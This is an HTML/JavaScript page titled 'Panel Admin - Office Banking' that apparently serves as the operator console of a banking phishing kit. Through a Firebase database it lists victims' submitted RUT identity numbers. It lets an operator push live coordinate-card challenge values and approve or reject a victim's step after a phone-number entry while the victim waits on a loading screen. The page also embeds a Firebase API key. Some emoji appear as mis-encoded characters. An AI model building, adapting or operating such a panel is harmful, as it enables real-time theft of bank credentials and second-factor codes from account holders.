
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Panel Admin - Office Banking</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 2rem;
      background: #f5f5f5;
      color: #333;
    }
    h1 {
      text-align: center;
      margin-bottom: 2rem;
    }
    .section {
      margin-bottom: 2rem;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
    }
    input[type="text"] {
      width: 80px;
      padding: 5px;
      margin-right: 1rem;
      text-align: center;
    }
    .registro {
      border-bottom: 1px solid #ccc;
      padding: 0.5rem 0;
    }
    button {
      padding: 0.5rem 1rem;
      background: #dc3545;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin: 0.25rem 0.5rem 0.25rem 0;
    }
    button:hover {
      background: #a7282f;
    }
    .switch {
      display: flex;
      align-items: center;
    }
    .switch input {
      margin-left: 1rem;
      transform: scale(1.5);
    }
  </style>
</head>
<body>
  <h1>Panel de Control - Office Banking</h1>

  <div class="section switch">
    <label for="modoAsistente">Modo Asistente</label>
    <input type="checkbox" id="modoAsistente" />
  </div>

  <div class="section">
    <label>Coordenadas en vivo</label>
    <input type="text" id="coord1" maxlength="2" />
    <input type="text" id="coord2" maxlength="2" />
    <input type="text" id="coord3" maxlength="2" />
    <button onclick="guardarCoordenadas()">Guardar</button>
  </div>

  <div class="section">
    <label>Validar paso luego de tel√©fono (pantalla cargando)</label>
    <button onclick="marcarValidacion('correcto')">‚úÖ Siguiente</button>
    <button onclick="marcarValidacion('incorrecto')">‚ùå Error</button>
  </div>

  <div class="section">
    <label>√öltimos ingresos</label>
    <div id="registros"></div>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const modoAsistente = document.getElementById("modoAsistente");
    modoAsistente.addEventListener("change", () => {
      db.ref("asistente").set(modoAsistente.checked);
    });

    db.ref("asistente").on("value", (snap) => {
      modoAsistente.checked = snap.val() === true;
    });

    function guardarCoordenadas() {
      const coord1 = document.getElementById("coord1").value;
      const coord2 = document.getElementById("coord2").value;
      const coord3 = document.getElementById("coord3").value;
      db.ref("coordenadas").set([coord1, coord2, coord3]);
    }

    function marcarValidacion(valor) {
      db.ref("validacion").set(valor);
    }

    const registrosDiv = document.getElementById("registros");
    db.ref("registros").limitToLast(10).on("child_added", (snap) => {
      const data = snap.val();
      const div = document.createElement("div");
      div.className = "registro";
      div.innerText = `üïì ${new Date(data.timestamp).toLocaleString()} ‚Äî RUT: ${data.rut}`;
      registrosDiv.prepend(div);
    });
  </script>
</body>
</html>
